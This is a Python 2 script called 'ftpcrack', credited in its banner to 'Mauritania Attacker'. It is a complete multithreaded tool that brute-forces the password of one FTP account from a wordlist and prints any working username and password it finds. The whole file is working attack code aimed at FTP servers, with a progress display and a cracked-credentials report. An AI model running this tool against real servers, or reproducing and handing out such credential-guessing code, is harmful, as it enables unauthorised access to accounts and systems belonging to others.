#!/usr/bin/python

import argparse, signal, Queue, time
from threading import Thread, Lock
from sys import argv, stdout
from os import getpid, kill
from ftplib import FTP, error_perm

class myThread (Thread):
    def __init__(self, threadID, name, q):
        Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.q = q
    def run(self):
        ftpcrack(self.name, self.q)

class Timer():
    def __enter__(self): self.start = time.time()
    def __exit__(self, *args):
        taken = time.time() - self.start
        seconds = int(time.strftime('%S', time.gmtime(taken)))
        minutes = int(time.strftime('%M', time.gmtime(taken)))
        hours = int(time.strftime('%H', time.gmtime(taken)))
        if minutes > 0:
            if hours > 0:
                print " [*] Time elapsed " + str(hours) + " hours, " + str(minutes) + " minutes and " + str(seconds) + " seconds at " + str(round(len(passwords) / taken,2)) + " trys per second."
            else:
                print " [*] Time elapsed " + str(minutes) + " minutes and " + str(seconds) + " seconds at " + str(round(len(passwords) / taken,2)) + " trys per second."
        else:
            print " [*] Time elapsed " + str(seconds) + " seconds at " + str(round(len(passwords) / taken,2)) + " trys per second."

class Printer():
    def __init__(self,data):
        stdout.write("\r\x1b[K"+data.__str__())
        stdout.flush()

def ftpcrack(threadName, q):
    while not exitFlag:
        queueLock.acquire()
        if not workQueue.empty():
            password = q.get()
            queueLock.release()
            mdone = ""
            while not mdone:
                try:
                    FTP(host, user, password)
                    print(" [*] Cracked: " + user + ":" + password + "  **-- Successful Login!")
                    creds = user + ":" + password
                    cracked.append(creds)
                    mdone = "1"
                except error_perm:
                    if len(password) < 20:
                        add = 20 - int(len(password))
                        password = str(password) + " " * add

                    progdone = len(passwords) - workQueue.qsize()
                    percent = round(float(100.00) / len(passwords) * progdone,2)
                    token = time.time() - startcnt
                    eta = round(token / progdone * len(passwords) - token,2)
                    Printer(" [>] " + str(percent) + "% Now trying: " + str(progdone) + "/" + str(len(passwords)) + " at " + str(round(progdone / token,2)) + " tries per second    User: " + user + " Password: " + password + "  -  Unsuccessful Login  ETA: "  + str(time.strftime('%H:%M:%S', time.gmtime(eta))))
                    mdone = "1"
                else:
                    pass
        else:
            queueLock.release()

def killpid(signum = 0, frame = 0):
    print "\r\x1b[K"
    kill(getpid(), 9)

parser = argparse.ArgumentParser(prog='ftpcrack', usage='ftpcrack [options]')
parser.add_argument('-t', "--threads", type=int, help='number of threads (default: 100)')
parser.add_argument('-i', "--ip", type=str, help='host to attack')
parser.add_argument('-u', "--user", type=str, help='username to attack')
parser.add_argument('-w', "--wordlist", type=str, help='wordlist')
args = parser.parse_args()

print '''
  __ _                             _    
/ _| |_ _ __   ___ _ __ __ _  ___| | __
| |_| __| '_ \ / __| '__/ _` |/ __| |/ /
|  _| |_| |_) | (__| | | (_| | (__|   < 
|_|  \__| .__/ \___|_|  \__,_|\___|_|\_\ 
        |_|                             
                       Developped By Mauritania Attacker
'''

if len(argv) == 1:
    parser.print_help()
    exit()

signal.signal(signal.SIGINT, killpid)
queueLock = Lock()
cracked = []
threads = []
creds = ""
exitFlag = 0
threadID = 1
maxthreads = 40

if args.threads:
    maxthreads = args.threads

passwords = [line.strip() for line in open(args.wordlist, 'r')]
user = args.user
host = args.ip

if not passwords or not user or not host:
    parser.print_help()
    exit()

try:
    connection = FTP(host, timeout=2)
    wlcmsg = connection.getwelcome()
    print wlcmsg
    print
except:
    print " [X] Error: it doesn't look like " + str(host) + " is an FTP server.."
    print
    exit()

print " [*] Loading " + str(len(passwords)) + " passwords to try.."

workQueue = Queue.Queue(len(passwords))

queueLock.acquire()
for passw in passwords:
    workQueue.put(passw)
queueLock.release()

while threadID <= maxthreads:
    tname = str("Thread-") + str(threadID)
    thread = myThread(threadID, tname, workQueue)
    thread.start()
    threads.append(thread)
    threadID += 1

startcnt = time.time()
print " [*] Starting attack on " + str(user) + "@" + str(host) + " with " + str(maxthreads) + " threads."
print

with Timer():
    while not workQueue.empty():
        if cracked:
            exitFlag = 1
        else:
            pass

    exitFlag = 1

    for t in threads:
        t.join()

    if cracked:
        print "\r\x1b[K\n [*] All threads has been completed, Cracked!! ^_^"
    else:
        print "\r\x1b[K\n [*] All threads has been completed, not cracked :("
